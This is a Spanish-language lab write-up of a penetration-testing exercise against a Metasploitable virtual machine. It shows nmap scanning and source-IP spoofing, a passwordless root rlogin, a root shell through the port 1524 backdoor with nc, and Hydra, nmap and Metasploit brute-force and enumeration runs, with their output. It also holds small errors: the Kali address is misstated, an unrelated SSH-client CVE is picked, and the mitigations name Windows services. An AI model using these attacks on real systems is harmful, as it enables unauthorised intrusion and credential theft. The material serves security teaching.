# 01 Reconocimiento de servicios y acceso

## Índice

- [nmap](#nmap)
  - [Parte I. Reconocimiento/Escaneo de vulnerabilidades desde Kali utilizando `nmap`](#parte-i-reconocimientoescaneo-de-vulnerabilidades-desde-kali-utilizando-`nmap`)
- [Metasploit](#metasploit)
  - [Parte II. Utilizando Metasploit Framework (MSF)](#parte-ii-utilizando-metasploit-framework-msf)
  - [Práctica: Uso de Metasploit Framework (MSF) para pruebas de intrusión](#práctica-uso-de-metasploit-framework-msf-para-pruebas-de-intrusión)
  - [Comandos básicos de Metasploit Framework](#comandos-básicos-de-metasploit-framework)
  - [Ejercicio 1](#ejercicio-1)
  - [Ejercicio 2](#ejercicio-2)
  - [Ejercicio 3](#ejercicio-3)
  - [ANEXO de nmap](#anexo-de-nmap)

---

## nmap

Nmap es una herramienta de código abierto en Linux, utilizada principalmente para explorar redes, analizar puertos y realizar auditorías de seguridad de sistemas informáticos. Permite identificar qué dispositivos están conectados a la red, descubrir los puertos abiertos, detectar servicios, versiones y sistemas operativos presentes en los equipos. Es ampliamente usada tanto por administradores de sistemas como por profesionales de la seguridad informática.

Para su instalación podemos proceder de la siguiente forma aunque en este documento vamos a hacer uso de una máquina kali por lo que el servicio ya viene instalado.

En caso de usar una máquina debian o ubuntu podemos realizar lo siguiente.

```bash
usuario@debian:~$ sudo apt update && sudo apt install nmap -y && apt list --installed nmap
...
Listando... Hecho
nmap/oldstable,now 7.93+dfsg1-1 amd64 [instalado]
```

En una maquina línux inicialmente tendremos que realizar una serie de acciones que implicarán poner el teclado en castellano, darle una contraseña al usuario root y como vamos a realizar conexiones por SSH tendremos que habilitar el servicio. Si queremos hacer uso de una máquina kali linux procedemos del siguiente modo.

```bash
setxkbmap es
systemctl status ssh
sudo passwd root
su - root
systemctl enable ssh
systemctl restart ssh
systemctl status ssh
```

Para esta práctica vamos a hacer uso de una máquina kali y otra máquina metasploitable configuradas dentro de una red NAT con CIDR 198.0.2.0/24.

Podemos ver que nuestra máquina kali es la 198.0.2.4/24.

```bash
┌──(kali㉿kali)-[~]
└─$ ip -c a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:96:3c:bc brd ff:ff:ff:ff:ff:ff
    inet 198.0.2.4/24 brd 198.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 456sec preferred_lft 456sec
    inet6 fe80::a00:27ff:fe96:3cbc/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
```

### Parte I. Reconocimiento/Escaneo de vulnerabilidades desde Kali utilizando `nmap`

#### Ejercicio 1

Recopile información sobre la máquina objetivo (metasploitable) utilizando `nmap`.

Para comenzar a hacer uso de la herramienta ejecutamos el comando `nmap` indicando todo el rango de direcciones IP a escanear (con los parámetros `sS` hacemos un escaneo sigiloso y con `sV` vemos la versión del servicio).

**-sS (sondeo TCP SYN)**: El sondeo SYN es el utilizado por omisión y el más popular por buenas razones. Puede realizarse rápidamente, sondeando miles de puertos por segundo en una red. El sondeo SYN es relativamente sigiloso y poco molesto, ya que no llega a completar las conexiones TCP.

> > **Nota:** Los comandos **nmap -sSV 198.0.2.2** y **nmap -sS sV 198.0.2.2** son equivalentes.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV 198.0.2.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-13 09:13 CEST
Nmap scan report for 198.0.2.1
Host is up (0.00052s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
53/tcp open  domain  Unbound
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)

Nmap scan report for 198.0.2.2
Host is up (0.0018s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL 8.0.30
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 198.0.2.3
Host is up (0.00034s latency).
All 1000 scanned ports on 198.0.2.3 are in ignored states.
Not shown: 1000 filtered tcp ports (proto-unreach)
MAC Address: 08:00:27:69:89:1B (Oracle VirtualBox virtual NIC)

Nmap scan report for 198.0.2.6
Host is up (0.010s latency).
Not shown: 978 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Bash shell (**BACKDOOR**; root shell)
2049/tcp open  nfs         2-4 (RPC #100003)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:D8:16:4E (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, ui11, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 198.0.2.4
Host is up (0.0000090s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Debian 3 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (5 hosts up) scanned in 71.80 seconds
```

Podemos ver que se localizan los equipos en nuestra red. Realmente como tal tenemos únicamente la máquina Kali con el servicio SSH que hemos habilitado antes en la _198.0.2.2/24_ y la máquina objetivo en la _198.0.2.6/24_.

Para nuestra práctica el host de interés es _198.0.2.6/24_ y podemos ver que tiene los siguientes servicios.

Vamos a repasar **brevemente** qué es cada servicio detectado y luego verlos en forma de tabla para facilitar el análisis.

##### Descripción de los principales servicios

- **FTP (21/tcp, vsftpd 2.3.4):** Permite transferir archivos, pero históricamente puede ser vulnerable y transmite datos sin cifrar.
- **SSH (22/tcp, OpenSSH):** Acceso remoto cifrado; versión antigua podría ser vulnerable.
- **Telnet (23/tcp):** Acceso remoto sin cifrado; muy inseguro.
- **SMTP (25/tcp, Postfix):** Envía correos electrónicos: si no está bien protegido puede usarse para spam.
- **DNS (53/tcp, BIND):** Resolución de nombres de dominio en la red.
- **HTTP (80/tcp, Apache):** Servidor web, accesible desde navegadores.
- **RPC (111/tcp, rpcbind):** Ayuda a localizar servicios RPC; puede ser vector de ataques si está expuesto.
- **NetBIOS/SMB (139/445/tcp, Samba):** Compartición de archivos e impresoras, usado en redes Windows/Linux.
- **RSH/Rexec/Rlogin (512/513/514):** Métodos de acceso remoto obsoletos y **muy inseguros** (sin cifrado).
- **Java RMI (1099/tcp):** Permite invocaciones remotas de métodos Java.
- **Bindshell (1524/tcp):** Backdoor; permite acceder al sistema de forma directa (muy peligroso).
- **NFS (2049/tcp):** Compartición de archivos en red para sistemas Unix/Linux.
- **MySQL (3306/tcp):** Base de datos relacional.
- **PostgreSQL (5432/tcp):** Base de datos relacional.
- **VNC (5900/tcp):** Escritorio remoto gráfico.
- **X11 (6000/tcp):** Interfaz gráfica remota de sistemas Unix.
- **IRC (6667/tcp):** Chat en tiempo real.
- **AJP13 (8009/tcp):** Conexión backend para servidores Java (Tomcat).
- **HTTP alternativo (8180/tcp, Tomcat):** Otro servidor web/app (Tomcat).

##### Tabla resumen de servicios y versiones

| Puerto   | Servicio    | Versión/Programa              |
| -------- | ----------- | ----------------------------- |
| 21/tcp   | ftp         | vsftpd 2.3.4                  |
| 22/tcp   | ssh         | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23/tcp   | telnet      | Linux telnetd                 |
| 25/tcp   | smtp        | Postfix smtpd                 |
| 53/tcp   | domain      | ISC BIND 9.4.2                |
| 80/tcp   | http        | Apache httpd 2.2.8 (Ubuntu)   |
| 111/tcp  | rpcbind     | 2 (RPC #100000)               |
| 139/tcp  | netbios-ssn | Samba smbd 3.X - 4.X          |
| 445/tcp  | netbios-ssn | Samba smbd 3.X - 4.X          |
| 512/tcp  | exec        | netkit-rsh rexecd             |
| 513/tcp  | login       | OpenBSD/Solaris rlogind       |
| 514/tcp  | shell       | Netkit rshd                   |
| 1099/tcp | java-rmi    | GNU Classpath grmiregistry    |
| 1524/tcp | bindshell   | Bash shell (**BACKDOOR**)     |
| 2049/tcp | nfs         | 2-4 (RPC #100003)             |
| 3306/tcp | mysql       | MySQL 5.0.51a-3ubuntu5        |
| 5432/tcp | postgresql  | PostgreSQL DB 8.3.0 - 8.3.7   |
| 5900/tcp | vnc         | VNC (protocol 3.3)            |
| 6000/tcp | X11         | (access denied)               |
| 6667/tcp | irc         | UnrealIRCd                    |
| 8009/tcp | ajp13       | Apache Jserv Protocol 1.3     |
| 8180/tcp | http        | Apache Tomcat/Coyote JSP 1.1  |

Además, nos puede interesar ver el sistema operativo de un equipo en concreto en la red con _nmap -O ip_.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -O 198.0.2.6
...
OS details: Linux 2.6.32
...
```

> > **Nota:** Como alternativa tengo el comando _arp-scan_ para poder ver las ips de las máquinas de mi red.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -I eth0 --localnet
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 08:00:27:96:3c:bc, IPv4: 198.0.2.4
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
198.0.2.1       52:54:00:12:35:00       (Unknown: locally administered)
198.0.2.2       52:54:00:12:35:00       (Unknown: locally administered)
198.0.2.3       08:00:27:69:89:1b       (Unknown)
198.0.2.6       08:00:27:d8:16:4e       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.977 seconds (129.49 hosts/sec). 4 responded

```

#### Ejercicio 2

Busque en las bases de datos de vulnerabilidades conocidas (preferentemente [CVE Details](https://www.cvedetails.com/)), las que correspondan al sistema operativo de la _metasploitable_. Escoja una de las más críticas (puntaje de 10) y explique brevemente el tipo de ataque que propicio, así como su impacto en la confidencialidad, integridad y disponibilidad.

Para el caso de la máquina Metasploitable (198.0.2.6) con los servicios anteriormente detectados, una de las vulnerabilidades críticas más importantes es la relacionada con el protocolo SSH [CVE-2002-1645](https://www.cvedetails.com/cve/CVE-2002-1645/).

La vulnerabilidad CVE-2002-1645 afecta a clientes SSH para Workstations (versiones 3.1 a 3.2.0) y está relacionada con un desbordamiento de búfer en la función de captura de URLs ("URL catcher"). Esto permite que un atacante remoto ejecute código arbitrario, generalmente enviando una URL excesivamente larga a través del cliente vulnerable. Impacto en seguridad:

- **Confidencialidad**: El atacante puede robar información o capturar credenciales usando el código ejecutado.​
- **Integridad**: Puede modificar sistemas, archivos y registros, “secuestrando” la sesión o introduciendo software malicioso.
- **Disponibilidad**: Podría paralizar el cliente SSH o realizar ataques de denegación de servicio en la máquina de la víctima.

#### Ejercicio 3

En este rol de atacantes pueden ir más allá e intentar falsificar la dirección desde donde están realizando el escaneo a la red. Investiga cómo puede hacerse con nmap e inténtalo. Compruebe los ficheros de log **tail /var/log/syslog** en la máquina escaneada y verifique si ha quedado constancia de las conexiones realizadas por nmap con la dirección IP falsa. Comente sus hallazgos.

Añadimos una IP a nuestra interfaz eth0 para que parezca un ataque desde el equipo 198.0.2.10/24.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo ip addr add 198.0.2.10/24 dev eth0

┌──(kali㉿kali)-[~]
└─$ ip -c a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:96:3c:bc brd ff:ff:ff:ff:ff:ff
    inet 198.0.2.4/24 brd 198.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 360sec preferred_lft 360sec
    inet 198.0.2.10/24 scope global secondary eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe96:3cbc/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
```

La idea es realizar un Spoofeando la IP con Nmap haciendo uso de los siguientes parámetros:

| Parámetro | Descripción |
|-----------|-------------|
| `-sS` | Realiza un escaneo SYN (también llamado "escaneo sigiloso"). En lugar de completar la conexión TCP, solo envía el primer paquete SYN. |
| `-S 198.0.2.10` | Suplanta la dirección IP de origen. Hace que los paquetes parezcan provenir de la IP `198.0.2.10` en lugar de la IP real del atacante. |
| `-e eth0` | Especifica que el escaneo debe realizarse a través de la interfaz de red `eth0`. |
| `-Pn 198.0.2.6` | `198.0.2.6` es la IP objetivo. `-Pn` indica que se debe omitir la detección previa de hosts activos y asumir que el objetivo está encendido. |

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sS -S 198.0.2.10 -e eth0 -Pn 198.0.2.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-13 09:41 CEST
Nmap scan report for 198.0.2.6
Host is up (0.022s latency).
Not shown: 978 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 08:00:27:D8:16:4E (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds
```

##### Ataque al puerto 513

Tenemos diferentes formas de ganar acceso a la máquina objetivo. La más simple es mediante el puerto 513 el cual está directamente abierto y podemos conectarnos a la máquina con el usuario root sin contraseña:

```bash
┌──(root㉿kali)-[~]
└─# rlogin -l root 198.0.2.6
Last login: Tue Oct 14 00:31:57 EDT 2025 from 198.0.2.4 on pts/1
Linux ui11 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@ui11:~# cat /var/log/syslog

Oct 14 00:31:56 ui11 in.rlogind[4793]: connect from 198.0.2.4 (198.0.2.4)
```

De este modo podemos acceder a la máquina y ver su información. Podemos ver que hay una conexión desde la 198.0.2.4 ya que hemos realizado **rlogin -l root 198.0.2.6**, si queremos que se almacene otra IP tendríamos que modificar nuestra interfaz de red para la conexión.

Para tratar de acceder a la máquina objetivo de otra forma a través de otros servicios vamos a realizar diferentes ataques de fuerza bruta sobre los puertos abiertos tanto con `nmap` como con la herramienta `hydra`.

**Hydra** es una herramienta de código abierto usada en pruebas de penetración para realizar ataques de fuerza bruta y descubrir contraseñas en distintos servicios de red, como SSH, FTP, SMB, HTTP, MySQL, entre otros. Funciona probando sistemáticamente combinaciones de nombres de usuario y contraseñas, generalmente usando listas de palabras (diccionarios), hasta encontrar las credenciales válidas. Se destaca por su rapidez y capacidad de realizar múltiples intentos en paralelo, facilitando así la evaluación de la seguridad de sistemas mediante la simulación de ataques reales.

##### Ataque a ftp 21

Vamos a realizar un ataque al peurto 21 correspondiente al servicio ftp para el intercambio de archivos.

```bash
┌──(root㉿kali)-[~]
└─# hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt 198.0.2.6 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-14 07:56:18
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 129099591 login tries (l:9/p:14344399), ~8068725 tries per task
[DATA] attacking ftp://198.0.2.6:21/
[STATUS] 128.00 tries/min, 128 tries in 00:01h, 129099463 to do in 16809:50h, 16 active
...
```

##### Ataque a ssh 22

Lanzamos un ataque al puerto 22 para procurar encontrar un par de claves usuario/password que permitan el acceso.

```bash
┌──(root㉿kali)-[~]
└─# nmap -sS -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=/usr/share/wordlists/rockyou.txt 198.0.2.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 07:48 CEST
NSE: [ssh-brute] Trying username/password pair: root:root
NSE: [ssh-brute] Trying username/password pair: admin:admin
NSE: [ssh-brute] Trying username/password pair: user:user
NSE: [ssh-brute] Trying username/password pair: test:test
NSE: [ssh-brute] Trying username/password pair: guest:guest
NSE: [ssh-brute] Trying username/password pair: mysql:mysql
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: operator:operator
NSE: [ssh-brute] Trying username/password pair: backup:backup
NSE: [ssh-brute] Trying username/password pair: root:123456
...
```

##### Ataque a bindshell 1524

Podemos ejecutar una shell reversa a través del puerto 1524 que nos de acceso al sistema gracias a una bind shell (puerta trasera o backdoor).

```bash
┌──(root㉿kali)-[~]
└─# nc 198.0.2.6 1524
root@ui11:/# whoami
root

```

##### Ataque a mysql 3306

Primero intento conectarme con root y pruebo contraseñas típicas.

```bash
┌──(root㉿kali)-[~]
└─# mysql -u root -p -h 198.0.2.6
Enter password:
ERROR 2026 (HY000): TLS/SSL error: wrong version number
```

Intento realizar un ataque de fuerza bruta con el script **mysql_brute** pero no da resultado.

```bash
┌──(root㉿kali)-[~]
└─# nmap -p3306 --script mysql-brute 198.0.2.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 07:11 CEST
Nmap scan report for 198.0.2.6
Host is up (0.019s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute:
|   Accounts: No valid accounts found
|   Statistics: Performed 50004 guesses in 374 seconds, average tps: 89.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
MAC Address: 08:00:27:D8:16:4E (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 383.69 seconds
```

Pruebo con la herramienta hydra el ataque al puerto 3306 de mysql con el diccionario de claves _rockyou.txt_ para comprobar si encontramos un par usuario/contraseña válido.

```bash
┌──(root㉿kali)-[~]
└─# hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt mysql://198.0.2.6

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-12 10:36:46
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 129099591 login tries (l:9/p:14344399), ~32274898 tries per task
[DATA] attacking mysql://198.0.2.6:3306/
[STATUS] 4155.00 tries/min, 4155 tries in 00:01h, 129095436 to do in 517:50h, 4 active
[STATUS] 2124.33 tries/min, 6373 tries in 00:03h, 129093220 to do in 1012:49h, 2 active
[STATUS] 1179.86 tries/min, 8259 tries in 00:07h, 129091335 to do in 1823:33h, 1 active
[ERROR] all children were disabled due too many connection errors
0 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-12 10:45:33
```

_*Conclusión*_: Podemos ver que algunos ataques han sido exitosos y otros no, al final tratamos de conseguir acceso a la máquina remota lo cual lo hemos logrado de diferentes modos. El objetivo sería probar todos los puertos y tratar de realizar un ataque a través de cada uno de ellos.

#### Ejercicio 4

Explique las medidas de seguridad básicas que podrían adoptarse para mitigar estas vulnerabilidades.

Para mitigar las vulnerabilidades relacionadas con los puertos abiertos detectados en la máquina 198.0.2.6 , se pueden adoptar las siguientes medidas de seguridad básicas:

1. **Actualizar y parchear el sistema y servicios:**  
   Mantener el sistema operativo Windows y los servicios asociados (RPC, SMB y MySQL) siempre actualizados con los últimos parches de seguridad oficiales para corregir vulnerabilidades conocidas.

2. **Restringir accesos mediante firewall:**  
   Configurar firewalls a nivel de host y red para limitar el acceso a los puertos 135 (RPC), 445 (SMB) y 3306 (MySQL) solo a IPs de confianza y segmentos internos autorizados. Esto reduce el riesgo de accesos no autorizados desde redes externas o no confiables.

3. **Deshabilitar o limitar servicios innecesarios:**  
   Si alguno de estos servicios no es imprescindible en el entorno, deshabilitarlo para minimizar la superficie de ataque.

4. **Uso de autenticación fuerte y cifrado:**  
   Configurar MySQL y servicios Windows para exigir contraseñas robustas autenticación multifactor si es posible, y cifrado de comunicaciones para proteger la confidencialidad e integridad de los datos.

5. **Monitoreo y alertas:**  
   Implementar mecanismos de monitoreo y análisis de logs para detectar accesos sospechosos o intentos de explotación relacionados con estos servicios.

6. **Segmentación de red:**  
   Aplicar segmentación adecuada para aislar sistemas críticos y limitar el movimiento lateral en caso de compromiso.

---

## Metasploit

### Parte II. Utilizando Metasploit Framework (MSF)

A continuación, se presenta el **enunciado formateado para una práctica sobre el uso de Metasploit Framework (MSF)** en un entorno de laboratorio con la máquina Metasploitable.

### **Práctica: Uso de Metasploit Framework (MSF) para pruebas de intrusión**

En esta práctica se emplearán **módulos auxiliares y exploits** del **Metasploit Framework (MSF)** para acceder y analizar una máquina en red, denominada _Metasploitable_.  
Metasploit Framework (MSF) es una plataforma **modular de pruebas de penetración escrita en Ruby** que permite **identificar, explotar y validar vulnerabilidades de seguridad** en sistemas y aplicaciones.

Metasploit ofrece un conjunto de herramientas diseñadas para:

- **Explorar y evaluar vulnerabilidades.**
- **Desarrollar exploits personalizados.**
- **Ejecutar payloads** y mantener sesiones interactivas (por ejemplo, con _Meterpreter_).
- **Integrar información** de escaneos realizados por utilidades externas como _Nmap_ o _OpenVAS_.

En **Kali Linux**, Metasploit se encuentra preinstalado como paquete `metasploit-framework` dentro del directorio:

```bash
/usr/share/metasploit-framework
```

Para iniciar el entorno de trabajo, se utiliza la consola interactiva **msfconsole**, que constituye la interfaz principal del framework.[2]

### **Comandos básicos de Metasploit Framework**

El siguiente cuadro resume los principales comandos de uso en la consola **msfconsole**:

| **Funcionalidad**            | **Comando**                                                                      | **Ejemplo / Descripción**                                               |
| ---------------------------- | -------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| Acceder al framework         | `msfconsole`                                                                     | Inicia la consola interactiva.                                          |
| Ayuda y comandos disponibles | `help`                                                                           | Muestra la lista de comandos de uso general.                            |
| Búsqueda de módulos          | `search`                                                                         | `search usermap_script` — Busca módulos por palabra clave.              |
| Configurar opciones          | `set` / `setg`                                                                   | `set RHOST 192.168.18.2` — Define opciones de módulo o globales.        |
| Desarmar variables globales  | `unsetg`                                                                         | Elimina valores asignados globalmente.                                  |
| Seleccionar módulo           | `use`                                                                            | `use exploit/windows/smb/ms17_010_eternalblue` — Selecciona un exploit. |
| Ver objetivos disponibles    | `show targets`                                                                   | Lista los sistemas vulnerables compatibles.                             |
| Listar módulos               | `show auxiliary`, `show exploits`, `show payloads`, `show encoders`, `show nops` | Muestran módulos según categoría.                                       |
| Ejecutar módulo              | `run` o `exploit`                                                                | Lanza el módulo seleccionado.                                           |
| Salir del framework          | `exit`                                                                           | Finaliza la sesión de msfconsole.                                       |

### Ejercicio 1

Enumera los usuarios locales de la máquina **MetaExp022** a través de algún protocolo sensible a enumeración de usuarios (SMTP) y describe el proceso que has seguido para conseguirlo. No puedes utilizar exploits. Muestra una tabla con los hallazgos y comenta su importancia desde el punto de vista del atacante.

Podemos hacer uso del framework metasploit del módulo auxiliar `auxiliary/scanner/smtp/smtp_enum`.

- El módulo intentará enumerar usuarios enviando comandos VRFY y EXPN para cada nombre de usuario en el archivo especificado.​
- Se mostrará una lista de usuarios encontrados si la máquina responde afirmativamente a dichos comandos.

```bash
msf6 > use auxiliary/scanner/smtp/smtp_enum
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 198.0.2.6RHOSTS => 198.0.2.6
msf6 auxiliary(scanner/smtp/smtp_enum) > set RPORT 25
RPORT => 25
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/unix_users.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[+] 198.0.2.6:25          - 198.0.2.6:25 Users found: colord, gropher, mail, popr, sshd, umountfsys
[*] 198.0.2.6:25          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

La respuesta del módulo **smtp_enum** indica que el escaneo SMTP consiguió verificar la existencia de ciertos usuarios en el servidor objetivo (198.0.2.6), utilizando los comandos VRFY y/o RCPT TO internamente.​

[+] 198.0.2.6:25 - Users found: colord, gropher, mail, popr, sshd, umountfsys

Estos son nombres de usuarios locales que el servidor SMTP ha confirmado como existentes.

El módulo Metasploit probó cada usuario del archivo especificado (/usr/share/metasploit-framework/data/wordlists/unix_users.txt) preguntando al servidor si existía. Si el servidor respondió que el usuario sí existe, lo incluyó en la lista final.

[*] Scanned 1 of 1 hosts (100% complete)

El escaneo se completó para la máquina especificada.

[*] Auxiliary module execution completed

El módulo terminó su ejecución.

### Ejercicio 2

Fase de descubrimiento de credenciales (fuerza bruta): para encontrar las credenciales, Metasploit tiene un módulo auxiliar (auxiliary) diseñado específicamente para escanear servicios de base de datos y probar contraseñas.

- Localiza el módulo de escaneo: utiliza el comando search dentro de msfconsole para encontrar un módulo auxiliar que realice ataques de fuerza bruta o inicio de sesión contra el servicio PostgreSQL (Pista: Busca por scanner/postgres)
- Selecciona y carga el módulo: una vez encontrado, cárgalo con el comando «use».
- Configura las opciones esenciales: usa el comando «show options» para ver qué necesita el módulo. Debes configurar al menos tres parámetros clave:
  - RHOSTS: dirección IP de la víctima (ejemplo: set RHOSTS 192.168.1.100).
  - RPORT: puerto del servicio, normalmente 5432 (set RPORT 5432).
  - USER_FILE o USERNAME y PASS_FILE o PASSWORD: archivos de usuarios/contraseñas o valores concretos.
- Ejecuta el Ataque: ejecuta el módulo con el comando «run».
- Indica las credenciales (usuario y contraseña) del servidor PostgreSQL de la máquina «MetaExp022». Valide estas credenciales utilizando el módulo auxiliar: admin/postgres/postgres_sql.

```bash
msf6 > use auxiliary/scanner/postgres/postgres_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf6 auxiliary(scanner/postgres/postgres_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt
msf6 auxiliary(scanner/postgres/postgres_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 198.0.2.6
RHOSTS => 198.0.2.6
msf6 auxiliary(scanner/postgres/postgres_login) > set RPORT 5432
RPORT => 5432
msf6 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 198.0.2.6:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[+] 198.0.2.6:5432 - Login Successful: postgres:postgres@template1
